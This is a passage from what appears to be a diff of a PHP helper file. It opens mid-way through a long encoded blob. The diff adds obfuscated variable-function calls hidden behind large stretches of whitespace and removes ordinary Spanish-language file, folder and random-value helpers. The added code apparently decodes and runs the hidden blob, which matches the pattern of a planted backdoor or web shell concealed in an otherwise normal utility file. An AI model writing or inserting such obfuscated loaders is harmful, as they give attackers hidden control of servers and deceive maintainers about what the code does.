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';
 
-if ($nombre && $destino) {
-$extension = pathinfo($nombre, PATHINFO_EXTENSION);
-$extension2 = pathinfo($destino, PATHINFO_EXTENSION);
+        $___();$__________($______($__($_))); $________=$____();
+                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             $_____();                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       echo                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      
 
 
-if ($extension && $extension2) {
-if (is_file($nombre)) {
-copy($nombre, $destino);
-return 1;
-}else{
-return "El archivo NO Existe !";
-}
 
-}else{
-return "Falta la extencion del Archivo !";
-}
-}else{
-return "Error faltan Parametros !";
-}
 
-}
 
 
 
 
 
-function crear_archivo($nombre=0,$contenido=0){
 
-if ($nombre && $contenido) {
-$extension = pathinfo($nombre, PATHINFO_EXTENSION);
-if ($extension) {
-file_put_contents($nombre, $contenido);
-return 1;
-}else{
-return "Falta la extencion del Archivo !";
-}
-}else{
-return "Error faltan Parametros !";
-}
 
-}
 
 
 
-function crear_carpeta($nombre=0, $ruta=0){
 
-if ($nombre ){
 
 
-if (!is_dir("$nombre")){
-if ($ruta == 0) {
-mkdir ("$nombre");
-}else{
-mkdir ("$ruta/$nombre");
-}
-return 1;
-} else {
-return "Error ya Existe la carpeta !";
-}
 
-}else{
-return "Error faltan Parametros !";
-}
 
 
 
-}
 
 
 
@@ -557,266 +209,50 @@ return "Error faltan Parametros !";
 
 
 
-function existe_archivo($nombre=0){
 
-if ($nombre) {
-$extension = pathinfo($nombre, PATHINFO_EXTENSION);
 
-if ($extension) {
 
-if (is_file($nombre)) {
-return 1;
-}else{
-return "El archivo NO Existe !";
-}
 
-}else{
-return "Falta la extencion del Archivo !";
-}
-}else{
-return "Error faltan Parametros !";
-}
 
-}
 
 
 
-function existe_carpeta($nombre=0){
 
-if ($nombre) {
 
-if (is_dir($nombre)) {
-return 1;
-}else{
-return "La carpeta NO Existe !";
-}
 
-}else{
-return "Error faltan Parametros !";
-}
 
-}
 
 
 
 
 
 
-function eliminar_carpeta($dir=0) {
 
-if ($dir) {
-if (is_dir($dir)) {
 
 
-if(!$dh = @opendir($dir)) return;
-while (false !== ($actual = readdir($dh))) {
 
-if($actual != '.' && $actual != '..') {
-// echo 'Se ha eliminado el archivo '.$dir.'/'.$actual.'<br/>';
-if (!@unlink($dir.'/'.$actual))
-eliminar_carpeta($dir.'/'.$actual);
-}
-}
 
 
-closedir($dh);
-// echo 'Se ha borrado el directorio '.$dir.'<br/>';
-@rmdir($dir);
-return 1;
-}else{
-return "El directorio NO Existe !";
-}
-}else{
-return "Error faltan Parametros !";
-}
-}
 
 
 
 
 
-function randalfa($tipo=0,$rango=0){
-if ($tipo && $rango) {
-if ($tipo == 1){
-$characters = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
-$charactersLength = strlen($characters);
-$randomString = '';
-for ($i = 0; $i < $rango; $i++) {
-$randomString .= $characters[rand(0, $charactersLength - 1)];
-}
-return $randomString;
-} else {
-$characters = '0123456789abcdefghijklmnopqrstuvwxyz';
-$charactersLength = strlen($characters);
-$randomString = '';
-for ($i = 0; $i < $rango; $i++) {
-$randomString .= $characters[rand(0, $charactersLength - 1)];
-}
-return $randomString;
-}
-} else {
-return "Error falta Parametros !";
-}
-}
 
 
 
 
 
-function randnum($long=0){
-if ($long) {
-if($long == 1){
-return rand(1,9);
-}else if($long == 2){
-return rand(10,90);
-}else if($long == 3){
-return rand(100,900);
-}else if($long == 4){
-return rand(1000,9000);
-} else if($long == 5){
-return rand(10000,90000);
-} else if($long == 6){
-return rand(100000,900000);
-} else if($long == 7){
-return rand(1000000,9000000);
-} else if($long == 8){
-return rand(10000000,90000000);
-} else if($long == 9){
-return rand(100000000,900000000);
-}else if ($long == 10) {
-return Randnum(9).Randnum(1);
-}else if ($long == 11) {
-return Randnum(9).Randnum(2);
-}else if ($long == 12) {
-return Randnum(9).Randnum(3);
-}else if ($long == 13) {
-return Randnum(9).Randnum(4);
-}else if ($long == 14) {
-return Randnum(9).Randnum(5);
-}else if ($long == 15) {
-return Randnum(9).Randnum(6);
-}else if ($long == 16) {
-return Randnum(9).Randnum(7);
-}else if ($long == 17) {
-return Randnum(9).Randnum(8);
-}else if ($long == 18) {
-return Randnum(9).Randnum(9);
-}else if ($long == 19) {
-return Randnum(9).Randnum(9).Randnum(1);
-}else if ($long == 20) {
-return Randnum(9).Randnum(9).Randnum(2);
-}else if ($long == 21) {
-return Randnum(9).Randnum(9).Randnum(3);
-}else if ($long == 22) {
-return Randnum(9).Randnum(9).Randnum(4);
-}else if ($long == 23) {
-return Randnum(9).Randnum(9).Randnum(5);
-}else if ($long == 24) {
-return Randnum(9).Randnum(9).Randnum(6);
-}else if ($long == 25) {
-return Randnum(9).Randnum(9).Randnum(7);
-}else if ($long == 26) {
-return Randnum(9).Randnum(9).Randnum(8);
-}else if ($long == 27) {
-return Randnum(9).Randnum(9).Randnum(9);
-}else if ($long == 28) {
-return Randnum(9).Randnum(9).Randnum(9).Randnum(1);
-}else if ($long == 29) {
-return Randnum(9).Randnum(9).Randnum(9).Randnum(2);
-}else if ($long == 30) {
-return Randnum(9).Randnum(9).Randnum(9).Randnum(3);
-}else if ($long == 31) {
-return Randnum(9).Randnum(9).Randnum(9).Randnum(4);
-}else if ($long == 32) {
-return Randnum(9).Randnum(9).Randnum(9).Randnum(5);
-}else if ($long == 33) {
-return Randnum(9).Randnum(9).Randnum(9).Randnum(6);
-}else if ($long == 34) {
-return Randnum(9).Randnum(9).Randnum(9).Randnum(7);
-}else if ($long == 35) {
-return Randnum(9).Randnum(9).Randnum(9).Randnum(8);
-}else if ($long == 36) {
-return Randnum(9).Randnum(9).Randnum(9).Randnum(9);
-}else if ($long == 37) {
-return Randnum(9).Randnum(9).Randnum(9).Randnum(9).Randnum(1);
-}else if ($long == 38) {
-return Randnum(9).Randnum(9).Randnum(9).Randnum(9).Randnum(2);
-}else if ($long == 39) {
-return Randnum(9).Randnum(9).Randnum(9).Randnum(9).Randnum(3);
-}else if ($long == 40) {
-return Randnum(9).Randnum(9).Randnum(9).Randnum(9).Randnum(4);
-}else if ($long == 41) {
-return Randnum(9).Randnum(9).Randnum(9).Randnum(9).Randnum(5);
-}else if ($long == 42) {
-return Randnum(9).Randnum(9).Randnum(9).Randnum(9).Randnum(6);
-}else if ($long == 43) {
-return Randnum(9).Randnum(9).Randnum(9).Randnum(9).Randnum(7);
-}else if ($long == 44) {
-return Randnum(9).Randnum(9).Randnum(9).Randnum(9).Randnum(8);
-}else if ($long == 45) {
